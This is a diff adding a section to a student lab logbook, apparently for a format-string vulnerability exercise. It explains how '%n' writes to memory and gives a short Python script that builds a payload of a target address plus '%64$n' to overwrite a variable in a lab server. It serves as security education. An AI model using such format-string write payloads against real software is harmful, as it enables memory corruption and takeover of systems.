@@ -99,3 +99,28 @@ By executing the auxiliar scrip we get the following outputs:
 ![Task2B](../docs/logbook7/task2b_2.png)
 
 The secret message is "A secret message".
+
+# Task 3: Modifying the Server Program’s Memory
+
+## Task 3.A: Change the value to a different value
+
+In this task, we need to change the value of the target. The initial value is 0x11223344 and the adress is 0x080e5068.
+
+The command "%n" in format strings, writes the number of characters written up to that point into the memory area of the argument passed as a parameter. The approach is very similar to the command in task 2.B, only instead of reading from the selected address, we will write.
+
+To change the value of the target, we created the following python scrip:
+```
+import sys
+
+content = (0x080e5068).to_bytes(4,byteorder='little') + ("%64$n").encode('latin-1')
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+![Task3A](../docs/logbook7/task3a_1.png)
+
+![Task3A_1](../docs/logbook7/task3a.png)
+
+After examining the output, we can see that the target variable value changed.
